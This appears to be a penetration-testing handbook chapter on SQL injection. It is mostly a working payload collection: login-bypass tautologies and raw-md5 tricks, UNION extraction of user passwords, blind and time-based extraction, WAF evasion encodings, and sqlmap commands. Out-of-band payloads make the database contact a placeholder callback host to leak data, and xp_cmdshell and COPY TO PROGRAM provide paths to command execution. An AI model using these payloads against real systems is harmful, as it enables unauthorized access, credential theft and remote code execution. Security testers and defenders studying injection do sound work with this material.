# Ch02 — SQL Injection (SQLi)

> Detection, DBMS fingerprinting, auth bypass, UNION/error/boolean/time/OOB techniques, stacked & second-order, WAF bypasses.
> Sources: `SQL Injection/` (README + MySQL/PostgreSQL/MSSQL/Oracle/SQLite/Cassandra/DB2/BigQuery cheat files, Intruder wordlists, SQLmap notes).

**Route here when**: a parameter flows into a relational query — quotes produce errors, arithmetic evaluates (`id=2-1` returns id=1 content), or tautologies change output.

**Safety**: detection (`'`, `SLEEP`, `AND 1=2`) is harmless. Auth-bypass tautologies (`' OR 1=1--`) can match every row — prefer `LIMIT 1` and never run them against delete/update endpoints. No dumping real user tables; prove with `@@version`, `current_user`, a canary row.

## Entry-point detection

| Probe | Meaning |
|---|---|
| `'`, `"`, `)`, `;` | break the quoting context — errors reveal the query shape |
| `%27`, `%22`, `%2527` | encoded/double-encoded quote variants |
| `U+02B9` (`%CA%B9`), `U+02BA` (`%CA%BA`) | unicode prime → normalized to `'` / `"` by some parsers |
| `1 AND 1=1` / `1 AND 1=2` | boolean pair: responses differ → numeric injectable |
| `1' AND '1'='1` / `' AND '1'='2` | boolean pair for string context |
| `1 or 1=1--`, `1" or 1=1--` | tautology in path/query |
| SLEEP/WAITFOR probes below | timing channel |

Comment/merge tricks to see what terminates cleanly:

```sql
'+HERP
'||'DERP
' 'DERP
'%20'HERP
'%2B'HERP
```

Comment styles differ per DBMS: `--` / `-- -` / `#` (MySQL), `--` (Postgres/Oracle/SQLite/MSSQL), `/*...*/` everywhere.

## DBMS identification

Keyword probes (response = true → that family):

| DBMS | Probe |
|---|---|
| MySQL | `conv('a',16,2)=conv('a',16,2)`, `connection_id()=connection_id()`, `crc32('MySQL')=crc32('MySQL')` |
| MSSQL | `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)`, `@@CONNECTIONS>0`, `USER_ID(1)=USER_ID(1)` |
| Oracle | `ROWNUM=ROWNUM`, `RAWTOHEX('AB')=RAWTOHEX('AB')`, `LNNVL(0=123)` |
| PostgreSQL | `5::int=5`, `pg_client_encoding()=pg_client_encoding()`, `current_database()=current_database()` |
| SQLite | `sqlite_version()=sqlite_version()`, `last_insert_rowid()>1` |
| MS Access | `val(cvar(1))=1`, `IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0` |

Error-message tells: MySQL → `You have an error in your SQL syntax`; Postgres → `ERROR: unterminated quoted string` / `syntax error at or near`; MSSQL → `Unclosed quotation mark` / `Incorrect syntax near` / `conversion of the varchar value ... to data type int`; Oracle → `ORA-00933` / `ORA-01756` / `ORA-00923`.

## Authentication bypass family

Tautology into a login query `... WHERE username = 'X' AND password = 'Y'`:

```sql
' OR '1'='1'--
' OR '1'='1' LIMIT 1 --      // returns exactly one row — avoids "too many results" errors
admin'--
' OR 1=1#
```

**When-to-use**: login forms where one field reaches the WHERE clause. Add `LIMIT 1` to log in as the first row (usually admin); keep the real username to target that user while nullifying the password check.

Caveat from source: `' OR 1=1` makes every row match — on non-login endpoints this can trigger mass updates/deletes. Scope it to read-only auth checks.

**Raw-md5 trick (PHP)**: when the app hashes the password inside the query — `"... pass = '".md5($pw,true)."'"` — an input whose raw md5 contains `'or'` breaks out. Known inputs: `ffifdyop` (md5 → `'or'6…`), `129581926211651571912466741651878684928` (md5 → `…'or'8`), `3fDf` (sha1 → `'='`), `178374` (sha1 → `'/*`).

**UNION auth bypass**: inject a row whose password column equals the hash of a password you choose — `admin' AND 1=0 UNION ALL SELECT 'admin','161ebd7d45089b3446ee4e0d86dbcf92'--` then log in with `P@ssw0rd` (that md5). Fails against salted KDFs.

## UNION-based extraction

```sql
1' UNION SELECT username, password FROM users --
```

Rules: same column count (probe `UNION SELECT NULL`, `UNION SELECT NULL,NULL`, … until no error); matching/compatible types (`NULL` works everywhere, then swap in `@@version`, `database()`, table/column names from `information_schema`).

## Error-based extraction

Force the DB to put the answer inside an error:

```sql
' AND CAST((SELECT version()) AS int)--                 -- MSSQL/Postgres
LIMIT CAST((SELECT version()) as numeric)               -- Postgres: ERROR: invalid input syntax for type numeric: "PostgreSQL 9.5.25 ..."
' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -- MySQL
' AND updatexml(1,concat(0x7e,(SELECT user())),1)--      -- MySQL
```

## Boolean blind extraction

When only true/false response differences exist (status, size, content):

```sql
1 AND 1=1 -- / 1 AND 1=2 --                 // confirm the oracle
1 AND LENGTH(@@hostname)=N --               // guess length first
1 AND ASCII(SUBSTRING(@@hostname,1,1))>64 -- // binary-search each char
```

Speed: dichotomy (halve the range per request), then per-char confirmation. Any observable difference — HTTP code, page size, presence/absence of an element — works as the oracle.

## Blind error-based (conditional error as oracle)

```sql
' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A    -- SQLite: true → OK, false → malformed JSON error
```

Swap `json('')` for any erroring expression valid in your DBMS (`1/0`, `CAST(x AS int)`).

## Time-based

```sql
' AND SLEEP(5)/*                          -- MySQL
' ; WAITFOR DELAY '00:00:05' --           -- MSSQL
' AND '1'='1' AND SLEEP(5)
1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--   -- Postgres
' AND IF(SUBSTRING(VERSION(),1,1)='5',BENCHMARK(1000000,MD5(1)),0)-- -- heavy-query variant
```

Oracle has no sleep: use `DBMS_LOCK.RECEIVE` (needs privs) or a heavy `COUNT(*)`/dual cross join. When = timing only — calibrate baseline RTT first; jittery networks give false positives.

## Out-of-band (OAST)

When there's no output and timing is unreliable — make the DB call out to DNS/UNC:

```sql
-- MySQL (Windows): UNC path → DNS request
LOAD_FILE('\\\\YOUR-CALLBACK\\a')
SELECT ... INTO OUTFILE '\\\\YOUR-CALLBACK\\a'

-- MSSQL
exec master..xp_dirtree '//YOUR-CALLBACK/a'
SELECT UTL_INADDR.get_host_address('YOUR-CALLBACK')     -- (Oracle-style fn; in MSSQL use xp_dirtree/OPENROWSET)

-- Oracle
SELECT UTL_INADDR.get_host_address('YOUR-CALLBACK') FROM dual
```

Requires the DB to reach DNS/SMB outbound — often works when HTTP egress is blocked.

## Stacked queries

```sql
1; EXEC xp_cmdshell('whoami') --
```

Only where the driver supports multi-statements (MSSQL, Postgres w/ some drivers, MySQL with `mysqli_multi_query`). On MSSQL, `xp_cmdshell` = command execution if enabled.

## Polyglot & routed

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/       -- works in ', ", and bare contexts
```

Routed (first query's output builds the second): hex-encode the inner payload — `0x2720756e696f6e2073656c65637420312c3223` = `' union select 1,2#`:

```sql
' union select 0x2720756e696f6e2073656c65637420312c3223#
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```

## Second-order SQLi

Payload is stored harmlessly, executed later by a different query:

1. Register `attacker'--` as username → stored as `attacker\'--`.
2. Later the app does `"... WHERE username = '" + user_from_db + "'"` → injection fires in the second query.

**When-to-use**: inputs that are escaped at write-time but concatenated raw at read-time (profile fields reflected into admin/report queries).

## PDO prepared-statement edge case (MySQL emulation)

PHP PDO with emulated prepares + injectable column identifier: smuggle `?` or `:` through the first parameter, inject SQL via the second.

```ps1
GET /index.php?col=%3f%23%00&name=anything              → syntax error proves the smuggle
GET /index.php?col=%3f%23%00&name=x%60;%23              → 'x';# breaks out
GET /index2.php?col=\%3f%23%00&name=x%60+FROM+(SELECT+table_name+AS+`'x`+from+information_schema.tables)y%3b%2523
```

Vulnerable: MySQL by default; Postgres only with `ATTR_EMULATE_PREPARES=true`; SQLite unaffected.

## Generic WAF bypasses

```sql
1%20AND%201=1                  → 1/**/AND/**/1=1        // comment for space
1%0AAND%0A1=1                  // newline/tab variants
-1' UNION SELECT 1,2,3 --      → -1' UNIunionON SELselectECT 1,2,3 --   // keyword-stripping once
-1' %55nion %53elect           → %55nion, %53elect      // first-letter encoding
AND 1=(SELECT 1 FROM t WHERE a=(SELECT a FROM t))       // no space after AND in some parsers
'a'='a'                        → 'a'LIKE'a'             // = filtered → LIKE / REGEXP / BETWEEN
substr(x,1,1)                  → mid(x,1,1), substring(x,1,1), left(x,1)   // keyword ban
'admin'                        → 0x61646d696e           // hex literals for strings
AnD                            → aNd / %41%6e%64        // case-sensitive rules
```

Comma filtered: `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b` instead of `SELECT 1,2`; `substr(x FROM 1 FOR 1)` instead of `substr(x,1,1)`.

## Per-DBMS quick notes

- **MySQL**: `@@version`, `information_schema.tables/.columns`, `LOAD_FILE()`, `INTO OUTFILE`, `SLEEP`, `BENCHMARK`. MySQL<5 lacks `information_schema` → brute table names.
- **PostgreSQL**: `version()`, `current_database()`, `pg_sleep`, `CAST(... AS int)` errors, `COPY ... TO PROGRAM` (superuser → RCE), dollar-quoting `$$`.
- **MSSQL**: `@@version`, `WAITFOR DELAY`, `xp_cmdshell`, `xp_dirtree` OOB, `OPENROWSET`, stacked queries common.
- **Oracle**: `FROM dual` required, `UTL_INADDR`/`UTL_HTTP`/`HTTPURITYPE` OOB, `DBMS_LOCK.RECEIVE`, no `#` comments.
- **SQLite**: `sqlite_version()`, `json('')` error oracle, `ATTACH DATABASE` file write → RCE-ish webshell paths, `||` concat, no SLEEP → heavy query.
- **Cassandra/CQL**: `ALLOW FILTERING`, no UNION — error/boolean only.
- **DB2**: `sysibm.tables`, `xmlagg`/`xmlforest` for OOB.
- **BigQuery**: backtick-quoted identifiers, `@@project_id`, `ERROR()` function for error-based.

## Automation handoff

```bash
sqlmap -u 'https://target/item?id=1*' --batch --level=2 --risk=1
sqlmap -r req.txt --batch --technique=BT --threads=4
```

Point sqlmap at a marked injection point (`*`), keep `--risk` low on production, prefer `--technique=B/T/U` over stacked/time-heavy modes. ghauri is the lighter alternative.
